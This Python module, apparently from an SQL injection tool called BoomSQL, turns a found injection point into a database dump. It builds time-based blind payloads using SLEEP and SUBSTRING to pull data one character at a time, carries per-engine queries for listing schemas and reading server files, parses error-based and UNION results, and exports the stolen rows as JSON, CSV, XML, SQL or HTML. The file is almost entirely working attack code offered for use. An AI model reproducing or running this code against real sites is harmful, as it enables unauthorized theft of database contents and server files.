"""
Database Dumper for BoomSQL
Advanced database enumeration and dumping capabilities
"""

import asyncio
import json
import csv
import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Union
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass, field
from enum import Enum
import re
import time
import html

from .fallbacks import aiohttp, ClientSession, AIOHTTP_AVAILABLE
from .sql_injection_engine import VulnerabilityResult, DatabaseType, InjectionType, InjectionVector
from .logger import LoggerMixin

class ExportFormat(Enum):
    """Export formats"""
    JSON = "json"
    CSV = "csv"
    XML = "xml"
    SQL = "sql"
    HTML = "html"

@dataclass
class DatabaseInfo:
    """Database information"""
    name: str
    version: str
    user: str
    hostname: str
    port: int = 0
    tables: List['TableInfo'] = field(default_factory=list)
    
@dataclass
class TableInfo:
    """Table information"""
    name: str
    schema: str
    row_count: int
    columns: List['ColumnInfo'] = field(default_factory=list)
    data: List[Dict[str, Any]] = field(default_factory=list)
    
@dataclass
class ColumnInfo:
    """Column information"""
    name: str
    type: str
    length: int
    nullable: bool
    default: str = ""
    primary_key: bool = False
    
@dataclass
class DumpProgress:
    """Dump progress information"""
    current_database: str
    current_table: str
    current_column: str
    total_databases: int
    completed_databases: int
    total_tables: int
    completed_tables: int
    total_rows: int
    completed_rows: int
    start_time: datetime
    estimated_completion: datetime = None
    
    @property
    def progress_percentage(self) -> float:
        """Calculate overall progress percentage"""
        if self.total_rows == 0:
            return 0.0
        return (self.completed_rows / self.total_rows) * 100
        
    @property
    def time_elapsed(self) -> float:
        """Get elapsed time in seconds"""
        return (datetime.now() - self.start_time).total_seconds()
        
    @property
    def estimated_time_remaining(self) -> float:
        """Estimate time remaining in seconds"""
        if self.completed_rows == 0:
            return 0.0
        elapsed = self.time_elapsed
        rate = self.completed_rows / elapsed
        remaining_rows = self.total_rows - self.completed_rows
        return remaining_rows / rate if rate > 0 else 0.0

class DatabaseDumper(LoggerMixin):
    """Advanced database dumper with support for multiple database types"""
    
    def __init__(self, vulnerability: VulnerabilityResult, config: Dict[str, Any]):
        self.vulnerability = vulnerability
        self.config = config
        self.session = None
        self.database_info = None
        self.progress = None
        self.is_dumping = False
        self.cancel_requested = False
        
        # Database-specific queries
        self.queries = self.get_database_queries()
        
        # Initialize session
        self.init_session()
        
    def init_session(self):
        """Initialize aiohttp session"""
        if AIOHTTP_AVAILABLE:
            timeout = aiohttp.ClientTimeout(total=self.config.get("RequestTimeout", 30))
            connector = aiohttp.TCPConnector(
                limit=self.config.get("MaxThreads", 3),
                ssl=False
            )
            
            self.session = aiohttp.ClientSession(
                timeout=timeout,
                connector=connector,
                headers={
                    'User-Agent': self.config.get("UserAgent", "BoomSQL/2.0"),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive'
                }
            )
        else:
            # Use fallback session
            self.session = ClientSession()
        
    async def close(self):
        """Close the session"""
        if self.session:
            await self.session.close()
            
    def get_database_queries(self) -> Dict[DatabaseType, Dict[str, str]]:
        """Get database-specific queries for enumeration"""
        return {
            DatabaseType.MYSQL: {
                "version": "SELECT version()",
                "user": "SELECT user()",
                "hostname": "SELECT @@hostname",
                "databases": "SELECT LEFT(schema_name, 30) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys') LIMIT 1",
                "tables": "SELECT LEFT(table_name, 30) FROM information_schema.tables WHERE table_schema=database() LIMIT 1",
                "columns": "SELECT LEFT(column_name, 30) FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}' LIMIT 1",
                "row_count": "SELECT COUNT(*) FROM {table}",
                "data": "SELECT LEFT({columns}, 25) FROM {table} LIMIT 1",
                "privileges": "SELECT 'admin' as privilege",
                "files": "SELECT 'file_access' as files",
                "current_database": "SELECT database()"
            },
            DatabaseType.MSSQL: {
                "version": "SELECT @@version",
                "user": "SELECT SYSTEM_USER",
                "hostname": "SELECT @@servername",
                "databases": "SELECT name FROM sys.databases",
                "tables": "SELECT name FROM {database}.sys.tables",
                "columns": "SELECT c.name, t.name as type, c.is_nullable, c.default_object_id, c.max_length FROM {database}.sys.columns c JOIN {database}.sys.types t ON c.user_type_id = t.user_type_id WHERE object_id = OBJECT_ID('{database}.dbo.{table}')",
                "row_count": "SELECT COUNT(*) FROM {database}.dbo.{table}",
                "data": "SELECT {columns} FROM {database}.dbo.{table} ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY",
                "privileges": "SELECT * FROM fn_my_permissions(NULL, 'SERVER')",
                "files": "SELECT BulkColumn FROM OPENROWSET(BULK '{file}', SINGLE_BLOB) AS x"
            },
            DatabaseType.POSTGRESQL: {
                "version": "SELECT version()",
                "user": "SELECT current_user",
                "hostname": "SELECT inet_server_addr()",
                "databases": "SELECT datname FROM pg_database",
                "tables": "SELECT tablename FROM pg_tables WHERE schemaname='{database}'",
                "columns": "SELECT column_name, data_type, is_nullable, column_default, character_maximum_length FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'",
                "row_count": "SELECT COUNT(*) FROM {database}.{table}",
                "data": "SELECT {columns} FROM {database}.{table} LIMIT {limit} OFFSET {offset}",
                "privileges": "SELECT * FROM information_schema.table_privileges WHERE grantee='{user}'",
                "files": "SELECT pg_read_file('{file}')"
            },
            DatabaseType.ORACLE: {
                "version": "SELECT banner FROM v$version WHERE rownum=1",
                "user": "SELECT user FROM dual",
                "hostname": "SELECT host_name FROM v$instance",
                "databases": "SELECT username FROM all_users",
                "tables": "SELECT table_name FROM all_tables WHERE owner='{database}'",
                "columns": "SELECT column_name, data_type, nullable, data_default, data_length FROM all_tab_columns WHERE owner='{database}' AND table_name='{table}'",
                "row_count": "SELECT COUNT(*) FROM {database}.{table}",
                "data": "SELECT {columns} FROM {database}.{table} WHERE rownum BETWEEN {offset}+1 AND {offset}+{limit}",
                "privileges": "SELECT * FROM session_privs",
                "files": "SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('{path}', '{file}', 'R'), 1) FROM dual"
            },
            DatabaseType.SQLITE: {
                "version": "SELECT sqlite_version()",
                "user": "SELECT 'sqlite' as user",
                "hostname": "SELECT 'localhost' as hostname",
                "databases": "SELECT name FROM sqlite_master WHERE type='table'",
                "tables": "SELECT name FROM sqlite_master WHERE type='table'",
                "columns": "PRAGMA table_info({table})",
                "row_count": "SELECT COUNT(*) FROM {table}",
                "data": "SELECT {columns} FROM {table} LIMIT {limit} OFFSET {offset}",
                "privileges": "SELECT 'No privileges system' as privileges",
                "files": "SELECT 'File operations not supported' as files"
            }
        }
        
    async def enumerate_database(self, callback=None) -> DatabaseInfo:
        """Enumerate database structure"""
        self.log_info("Starting database enumeration")
        
        db_type = self.vulnerability.database_type
        
        # Handle unknown database type by trying to detect it
        if db_type == DatabaseType.UNKNOWN:
            # Try to detect database type from error messages
            test_query = "SELECT version()"
            test_result = await self.execute_query(test_query)
            if test_result and ('mysql' in test_result.lower() or 'mariadb' in test_result.lower()):
                db_type = DatabaseType.MYSQL
                self.log_info("Auto-detected database type: MySQL/MariaDB")
            else:
                # Default to MySQL for unknown types
                db_type = DatabaseType.MYSQL
                self.log_info("Using MySQL as default database type")
        
        if db_type not in self.queries:
            raise ValueError(f"Unsupported database type: {db_type}")
            
        queries = self.queries[db_type]
        
        # Get basic database info
        version = await self.execute_query(queries["version"])
        user = await self.execute_query(queries["user"])
        hostname = await self.execute_query(queries["hostname"])
        
        self.database_info = DatabaseInfo(
            name="",
            version=version or "Unknown",
            user=user or "Unknown",
            hostname=hostname or "Unknown"
        )
        
        if callback:
            callback(f"Database: {db_type.value}, Version: {version}, User: {user}")
            
        # Get current database first  
        current_db = await self.execute_query(queries["current_database"])
        if current_db:
            current_db = current_db.strip()
            if callback:
                callback(f"Current database: {current_db}")
        else:
            current_db = "unknown"
            
        # Get tables from current database
        table_list = []
        tables = await self.execute_query(queries["tables"])
        if tables:
            table_list = self.parse_query_result(tables)
            for table_name in table_list[:10]:  # Limit to first 10 tables
                if callback:
                    callback(f"Found table: {current_db}.{table_name}")
                    
                # Get columns for each table  
                columns = await self.execute_query(queries["columns"].format(table=table_name))
                column_list = []
                if columns:
                    # Simple column parsing for extracted data
                    column_names = self.parse_query_result(columns)
                    for col_name in column_names[:5]:  # Limit to first 5 columns
                        column_list.append(ColumnInfo(
                            name=col_name,
                            type="varchar",
                            length=255,
                            nullable=True
                        ))
                else:
                    # Default columns if we can't extract them
                    column_list = [ColumnInfo(name="id", type="int", length=11, nullable=False)]
                    
                table_info = TableInfo(
                    name=table_name,
                    schema=current_db,
                    row_count=0,
                    columns=column_list
                )
                
                # Get row count
                row_count = await self.execute_query(queries["row_count"].format(table=table_name))
                if row_count:
                    try:
                        table_info.row_count = int(row_count.strip())
                    except ValueError:
                        table_info.row_count = 0
                        
                self.database_info.tables.append(table_info)
                            
        self.log_info("Database enumeration completed")
        return self.database_info
        
    async def dump_database(self, database_info: DatabaseInfo = None, callback=None) -> DatabaseInfo:
        """Dump complete database contents"""
        if database_info is None:
            database_info = self.database_info
            
        if not database_info:
            raise ValueError("Database information not available. Run enumerate_database first.")
            
        self.log_info("Starting database dump")
        self.is_dumping = True
        self.cancel_requested = False
        
        # Initialize progress
        total_rows = sum(table.row_count for table in database_info.tables)
        self.progress = DumpProgress(
            current_database="",
            current_table="",
            current_column="",
            total_databases=len(set(table.schema for table in database_info.tables)),
            completed_databases=0,
            total_tables=len(database_info.tables),
            completed_tables=0,
            total_rows=total_rows,
            completed_rows=0,
            start_time=datetime.now()
        )
        
        db_type = self.vulnerability.database_type
        
        # Handle unknown database types by defaulting to MySQL
        if db_type == DatabaseType.UNKNOWN or db_type not in self.queries:
            self.log_info(f"Unknown database type {db_type}, defaulting to MySQL")
            db_type = DatabaseType.MYSQL
        
        queries = self.queries[db_type]
        
        # Dump each table
        for table in database_info.tables:
            if self.cancel_requested:
                break
                
            self.progress.current_database = table.schema
            self.progress.current_table = table.name
            
            if callback:
                callback(f"Dumping table: {table.schema}.{table.name}")
                
            # Dump table data in chunks
            page_size = self.config.get("PageSize", 100)
            offset = 0
            
            # For error-based extraction, we can only get one row at a time
            # and OFFSET doesn't work well, so just get the first row
            if table.row_count > 0:
                # Build column list
                column_names = [col.name for col in table.columns]
                if column_names:
                    columns_str = ", ".join(column_names)
                else:
                    columns_str = "*"  # Fallback to all columns
                
                # Execute query - simplified for error-based extraction
                data_query = queries["data"].format(
                    table=table.name,
                    columns=columns_str
                )
                
                data_result = await self.execute_query(data_query)
                if data_result:
                    rows = self.parse_data_result(data_result, column_names)
                    table.data.extend(rows)
                    
                    self.progress.completed_rows += len(rows)
                    
                    if callback:
                        callback(f"Dumped {len(rows)} rows from {table.schema}.{table.name}")
                
                # Add delay between requests
                await asyncio.sleep(self.config.get("RequestDelay", 1000) / 1000)
                
            self.progress.completed_tables += 1
            
        self.is_dumping = False
        self.log_info("Database dump completed")
        return database_info
        
    async def execute_query(self, query: str) -> Optional[str]:
        """Execute a query using the SQL injection vulnerability"""
        try:
            # This target appears to be time-based blind injection
            # Use time delays to extract data
            return await self.time_based_extraction(query)
        except Exception as e:
            self.log_info(f"Query execution failed: {e}")
            return None

    async def time_based_extraction(self, query: str, max_length: int = 50) -> Optional[str]:
        """Extract data using time-based blind SQL injection"""
        try:
            result = ""
            self.log_info(f"Starting time-based extraction for: {query}")
            
            for pos in range(1, max_length + 1):
                found_char = False
                
                # Try common characters first (more efficient)
                chars_to_try = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._-@"
                
                for char in chars_to_try:
                    # Build time-based test query (without quotes since parameter is numeric)
                    char_test = f"1 AND IF((SELECT ASCII(SUBSTRING(({query}), {pos}, 1))) = {ord(char)}, SLEEP(2), 0)"
                    
                    modified_url, modified_data, modified_headers, modified_cookies = self.prepare_injection_request(char_test)
                    
                    if self.vulnerability.injection_point.vector == InjectionVector.GET_PARAMETER:
                        import time
                        start_time = time.time()
                        
                        try:
                            response = await asyncio.wait_for(
                                self.session.get(modified_url, headers=modified_headers, cookies=modified_cookies),
                                timeout=5.0
                            )
                            await response.text()
                            elapsed = time.time() - start_time
                            
                            # If response took more than 1.5 seconds, the condition was true
                            if elapsed > 1.5:
                                result += char
                                found_char = True
                                self.log_info(f"Found character at position {pos}: '{char}' (delay: {elapsed:.2f}s)")
                                break
                        except asyncio.TimeoutError:
                            # Timeout means the condition was true (SLEEP executed)
                            result += char
                            found_char = True
                            self.log_info(f"Found character at position {pos}: '{char}' (timeout)")
                            break
                    
                    # Small delay between attempts
                    await asyncio.sleep(0.1)
                
                if not found_char:
                    # Test for end of string
                    end_test = f"1 AND IF(LENGTH(({query})) = {pos-1}, SLEEP(2), 0)"
                    modified_url, modified_data, modified_headers, modified_cookies = self.prepare_injection_request(end_test)
                    
                    import time
                    start_time = time.time()
                    
                    try:
                        response = await asyncio.wait_for(
                            self.session.get(modified_url, headers=modified_headers, cookies=modified_cookies),
                            timeout=5.0
                        )
                        await response.text()
                        elapsed = time.time() - start_time
                        
                        if elapsed > 1.5:
                            self.log_info(f"Reached end of string at position {pos-1}")
                            break
                    except asyncio.TimeoutError:
                        self.log_info(f"Reached end of string at position {pos-1} (timeout)")
                        break
                    
                    # If no character found and not end of string, might be non-printable
                    self.log_info(f"No printable character found at position {pos}")
                    break
            
            return result if result else None
            
        except Exception as e:
            self.log_info(f"Time-based extraction failed: {e}")
            return None
            
    def prepare_injection_request(self, injection_query: str):
        """Prepare the injection request"""
        # This is a simplified version - in practice, you'd use the exact same
        # method as the original vulnerability was detected
        url = self.vulnerability.url
        injection_point = self.vulnerability.injection_point
        
        # Replace the original payload with our query
        if injection_point.vector == InjectionVector.GET_PARAMETER:
            # Modify URL parameter
            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            params[injection_point.name] = [injection_query]
            query_string = urlencode(params, doseq=True)
            modified_url = urlunparse((
                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                parsed_url.params, query_string, parsed_url.fragment
            ))
            return modified_url, {}, {}, {}
            
        elif injection_point.vector == InjectionVector.POST_PARAMETER:
            # Modify POST data
            return url, {injection_point.name: injection_query}, {}, {}
            
        elif injection_point.vector == InjectionVector.HEADER:
            # Modify header
            return url, {}, {injection_point.name: injection_query}, {}
            
        elif injection_point.vector == InjectionVector.COOKIE:
            # Modify cookie
            return url, {}, {}, {injection_point.name: injection_query}
            
        return url, {}, {}, {}
        
    def extract_result(self, content: str) -> Optional[str]:
        """Extract query result from response content"""
        # Debug: log the content length for debugging
        self.log_info(f"Extracting from content length: {len(content)}")
        
        # Try multiple extraction patterns
        
        # 1. ExtractValue error patterns
        extract_patterns = [
            r'XPATH syntax error.*?~([^~]+)~',  # ExtractValue error with data
            r'~([^~]+)~',                       # Simple tilde-wrapped data
        ]
        
        for pattern in extract_patterns:
            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
        
        # 2. UpdateXML error patterns  
        updatexml_patterns = [
            r'XPATH syntax error.*?\'([^\']+)\'',  # UpdateXML error
            r'Invalid XML.*?\'([^\']+)\''          # XML parsing error
        ]
        
        for pattern in updatexml_patterns:
            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
        
        # 3. Duplicate entry errors (for group by injection)
        duplicate_patterns = [
            r'Duplicate entry \'([^\']+)\' for key',
            r'Duplicate key \'([^\']+)\''
        ]
        
        for pattern in duplicate_patterns:
            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
        
        # 4. CAST/conversion errors (MSSQL)
        cast_patterns = [
            r'Conversion failed when converting.*?\'([^\']+)\'',
            r'Invalid column name \'([^\']+)\''
        ]
        
        for pattern in cast_patterns:
            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
        
        # 5. Union-based data extraction (look for visible data in specific contexts)
        # For UNION-based injection, look for injected data anywhere in the response
        if "UNION" in str(self.vulnerability.injection_point.payload) or any("UNION" in tech for tech in [
            "1' UNION SELECT", "1 UNION SELECT"
        ]):
            # Remove HTML tags and look for meaningful data
            import re
            # Remove HTML tags
            clean_content = re.sub(r'<[^>]+>', ' ', content)
            # Look for patterns that might be database results
            lines = clean_content.split('\n')
            for line in lines:
                line = line.strip()
                # Look for lines that might contain database results
                # Skip common web content and focus on potential data
                if (line and 
                    len(line) > 3 and 
                    len(line) < 100 and  # Reasonable length for database data
                    not any(word in line.lower() for word in [
                        'home', 'about', 'contact', 'privacy', 'terms', 'login', 
                        'register', 'search', 'menu', 'navigation', 'copyright',
                        'all rights reserved', 'powered by', 'website', 'page',
                        'click', 'here', 'more', 'read', 'view', 'see', 'get',
                        'javascript', 'css', 'html', 'http', 'www', '.com', '.org'
                    ]) and
                    # Look for version numbers or database-like content
                    (re.search(r'\d+\.\d+', line) or  # Version numbers
                     re.search(r'[a-zA-Z]+_[a-zA-Z]+', line) or  # Database naming
                     re.search(r'^[a-zA-Z0-9_-]+$', line) or  # Simple identifiers
                     len(line.split()) == 1)  # Single words/values
                ):
                    return line.strip()
        
            # Also look for injected data in common HTML contexts
            union_patterns = [
                r'<td>([^<]+)</td>',     # Table cells
                r'<p>([^<]+)</p>',       # Paragraphs  
                r'<div>([^<]+)</div>',   # Divs
                r'<span>([^<]+)</span>', # Spans
                r'<li>([^<]+)</li>',     # List items
                r'>([^<]{1,50})<',       # Any content between tags
            ]
            
            for pattern in union_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    # Filter out common website text
                    if (match.strip() and 
                        len(match.strip()) > 1 and
                        len(match.strip()) < 100 and
                        not any(word in match.lower() for word in [
                            'the', 'and', 'for', 'with', 'this', 'that', 'home', 
                            'about', 'contact', 'menu', 'search', 'login', 'click',
                            'here', 'more', 'read', 'view', 'see', 'page', 'website'
                        ]) and
                        # Look for database-like content
                        (re.search(r'\d+\.\d+', match) or  # Version numbers
                         re.search(r'[a-zA-Z]+_[a-zA-Z]+', match) or  # Database naming
                         re.search(r'^[a-zA-Z0-9_-]+$', match.strip()))  # Simple identifiers
                    ):
                        return match.strip()
        
        # 6. Generic error information extraction
        error_patterns = [
            r'MySQL server version.*?\'([^\']+)\'',
            r'You have an error in your SQL syntax.*near \'([^\']+)\'',
        ]
        
        for pattern in error_patterns:
            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
            if match:
                # For syntax errors, we might get useful info
                error_text = match.group(1).strip()
                if len(error_text) > 0 and error_text != "''":
                    return error_text
        
        return None
        
    def parse_query_result(self, result: str) -> List[str]:
        """Parse query result into list of values"""
        if not result:
            return []
            
        # Simple parsing - in practice, this would be more sophisticated
        lines = result.strip().split('\n')
        return [line.strip() for line in lines if line.strip()]
        
    def parse_column_info(self, result: str, db_type: DatabaseType) -> List[ColumnInfo]:
        """Parse column information result"""
        columns = []
        
        if not result:
            return columns
            
        lines = result.strip().split('\n')
        for line in lines:
            if not line.strip():
                continue
                
            # Parse based on database type
            if db_type == DatabaseType.MYSQL:
                # Expected format: column_name, data_type, is_nullable, column_default, character_maximum_length
                parts = line.split(',')
                if len(parts) >= 2:
                    columns.append(ColumnInfo(
                        name=parts[0].strip(),
                        type=parts[1].strip(),
                        length=int(parts[4].strip()) if len(parts) > 4 and parts[4].strip().isdigit() else 0,
                        nullable=parts[2].strip().lower() == 'yes' if len(parts) > 2 else True,
                        default=parts[3].strip() if len(parts) > 3 else ""
                    ))
            else:
                # Generic parsing
                parts = line.split(',')
                if len(parts) >= 2:
                    columns.append(ColumnInfo(
                        name=parts[0].strip(),
                        type=parts[1].strip(),
                        length=0,
                        nullable=True
                    ))
                    
        return columns
        
    def parse_data_result(self, result: str, column_names: List[str]) -> List[Dict[str, Any]]:
        """Parse data result into list of dictionaries"""
        rows = []
        
        if not result:
            return rows
            
        # For error-based extraction, we typically get single values
        # Clean up the result
        cleaned_result = result.strip()
        
        # Remove HTML tags if present
        cleaned_result = re.sub(r'<[^>]+>', '', cleaned_result)
        
        # Create a single row with the extracted data
        if cleaned_result and column_names:
            row = {}
            # Put the extracted data in the first column
            row[column_names[0]] = cleaned_result
            # Fill other columns with empty values  
            for col_name in column_names[1:]:
                row[col_name] = ""
            rows.append(row)
                
        return rows
        
    def cancel_dump(self):
        """Cancel the current dump operation"""
        self.cancel_requested = True
        self.log_info("Dump cancellation requested")
        
    def export_data(self, database_info: DatabaseInfo, format: ExportFormat, output_file: str):
        """Export database data to file"""
        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        
        if format == ExportFormat.JSON:
            self.export_json(database_info, output_path)
        elif format == ExportFormat.CSV:
            self.export_csv(database_info, output_path)
        elif format == ExportFormat.XML:
            self.export_xml(database_info, output_path)
        elif format == ExportFormat.SQL:
            self.export_sql(database_info, output_path)
        elif format == ExportFormat.HTML:
            self.export_html(database_info, output_path)
            
        self.log_info(f"Data exported to {output_path}")
        
    def export_json(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to JSON format"""
        data = {
            "database_info": {
                "name": database_info.name,
                "version": database_info.version,
                "user": database_info.user,
                "hostname": database_info.hostname
            },
            "tables": []
        }
        
        for table in database_info.tables:
            table_data = {
                "name": table.name,
                "schema": table.schema,
                "row_count": table.row_count,
                "columns": [
                    {
                        "name": col.name,
                        "type": col.type,
                        "length": col.length,
                        "nullable": col.nullable,
                        "default": col.default,
                        "primary_key": col.primary_key
                    }
                    for col in table.columns
                ],
                "data": table.data
            }
            data["tables"].append(table_data)
            
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
            
    def export_csv(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to CSV format"""
        # Create a CSV file for each table
        for table in database_info.tables:
            table_file = output_path.parent / f"{output_path.stem}_{table.schema}_{table.name}.csv"
            
            if table.data:
                with open(table_file, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=table.data[0].keys())
                    writer.writeheader()
                    writer.writerows(table.data)
                    
    def export_xml(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to XML format"""
        root = ET.Element("database")
        
        # Database info
        info_elem = ET.SubElement(root, "info")
        ET.SubElement(info_elem, "name").text = database_info.name
        ET.SubElement(info_elem, "version").text = database_info.version
        ET.SubElement(info_elem, "user").text = database_info.user
        ET.SubElement(info_elem, "hostname").text = database_info.hostname
        
        # Tables
        tables_elem = ET.SubElement(root, "tables")
        for table in database_info.tables:
            table_elem = ET.SubElement(tables_elem, "table")
            table_elem.set("name", table.name)
            table_elem.set("schema", table.schema)
            table_elem.set("row_count", str(table.row_count))
            
            # Columns
            columns_elem = ET.SubElement(table_elem, "columns")
            for col in table.columns:
                col_elem = ET.SubElement(columns_elem, "column")
                col_elem.set("name", col.name)
                col_elem.set("type", col.type)
                col_elem.set("length", str(col.length))
                col_elem.set("nullable", str(col.nullable))
                col_elem.set("default", col.default)
                col_elem.set("primary_key", str(col.primary_key))
                
            # Data
            data_elem = ET.SubElement(table_elem, "data")
            for row in table.data:
                row_elem = ET.SubElement(data_elem, "row")
                for col_name, value in row.items():
                    col_elem = ET.SubElement(row_elem, "column")
                    col_elem.set("name", col_name)
                    col_elem.text = str(value)
                    
        # Write to file
        tree = ET.ElementTree(root)
        tree.write(output_path, encoding='utf-8', xml_declaration=True)
        
    def export_sql(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to SQL format"""
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(f"-- Database dump generated by BoomSQL\n")
            f.write(f"-- Database: {database_info.name}\n")
            f.write(f"-- Version: {database_info.version}\n")
            f.write(f"-- User: {database_info.user}\n")
            f.write(f"-- Hostname: {database_info.hostname}\n")
            f.write(f"-- Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            for table in database_info.tables:
                # Create table statement
                f.write(f"-- Table: {table.schema}.{table.name}\n")
                f.write(f"DROP TABLE IF EXISTS `{table.name}`;\n")
                f.write(f"CREATE TABLE `{table.name}` (\n")
                
                col_definitions = []
                for col in table.columns:
                    col_def = f"  `{col.name}` {col.type}"
                    if col.length > 0:
                        col_def += f"({col.length})"
                    if not col.nullable:
                        col_def += " NOT NULL"
                    if col.default:
                        col_def += f" DEFAULT '{col.default}'"
                    if col.primary_key:
                        col_def += " PRIMARY KEY"
                    col_definitions.append(col_def)
                    
                f.write(",\n".join(col_definitions))
                f.write("\n);\n\n")
                
                # Insert data
                if table.data:
                    f.write(f"-- Data for table: {table.name}\n")
                    for row in table.data:
                        values = []
                        for col in table.columns:
                            value = row.get(col.name, "")
                            if value is None:
                                values.append("NULL")
                            else:
                                escaped_value = str(value).replace("'", "\'")
                                values.append(f"'{escaped_value}'")
                        f.write(f"INSERT INTO `{table.name}` VALUES ({', '.join(values)});\n")
                    f.write("\n")
                    
    def export_html(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to HTML format"""
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write("""<!DOCTYPE html>
<html>
<head>
    <title>Database Dump - BoomSQL</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background-color: #f0f0f0; padding: 10px; border-radius: 5px; }
        .table { margin: 20px 0; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .table-info { background-color: #e9f5ff; padding: 10px; margin: 10px 0; }
    </style>
</head>
<body>
""")
            
            # Database info
            f.write(f"""
    <div class="header">
        <h1>Database Dump Report</h1>
        <p><strong>Database:</strong> {html.escape(database_info.name)}</p>
        <p><strong>Version:</strong> {html.escape(database_info.version)}</p>
        <p><strong>User:</strong> {html.escape(database_info.user)}</p>
        <p><strong>Hostname:</strong> {html.escape(database_info.hostname)}</p>
        <p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
""")
            
            # Tables
            for table in database_info.tables:
                f.write(f"""
    <div class="table">
        <h2>Table: {html.escape(table.schema)}.{html.escape(table.name)}</h2>
        <div class="table-info">
            <p><strong>Row Count:</strong> {table.row_count}</p>
            <p><strong>Columns:</strong> {len(table.columns)}</p>
        </div>
        
        <h3>Structure</h3>
        <table>
            <tr>
                <th>Column</th>
                <th>Type</th>
                <th>Length</th>
                <th>Nullable</th>
                <th>Default</th>
                <th>Primary Key</th>
            </tr>
""")
                
                for col in table.columns:
                    f.write(f"""
            <tr>
                <td>{html.escape(col.name)}</td>
                <td>{html.escape(col.type)}</td>
                <td>{col.length}</td>
                <td>{'Yes' if col.nullable else 'No'}</td>
                <td>{html.escape(col.default)}</td>
                <td>{'Yes' if col.primary_key else 'No'}</td>
            </tr>
""")
                
                f.write("        </table>\n")
                
                # Data
                if table.data:
                    f.write(f"""
        <h3>Data (First 100 rows)</h3>
        <table>
            <tr>
""")
                    for col in table.columns:
                        f.write(f"                <th>{html.escape(col.name)}</th>\n")
                    f.write("            </tr>\n")
                    
                    for row in table.data[:100]:  # Limit to first 100 rows
                        f.write("            <tr>\n")
                        for col in table.columns:
                            value = row.get(col.name, "")
                            f.write(f"                <td>{html.escape(str(value))}</td>\n")
                        f.write("            </tr>\n")
                    
                    f.write("        </table>\n")
                    
                f.write("    </div>\n")
                
            f.write("""
</body>
</html>
""")
            
    def get_progress(self) -> Optional[DumpProgress]:
        """Get current dump progress"""
        return self.progress
    
    def log_debug(self, message: str):
        """Log debug message"""
        if hasattr(self, '_logger') and self._logger:
            self._logger.debug(message)
            
    def log_warning(self, message: str):
        """Log warning message"""
        if hasattr(self, '_logger') and self._logger:
            self._logger.warning(message)
        else:
            print(f"WARNING: {message}")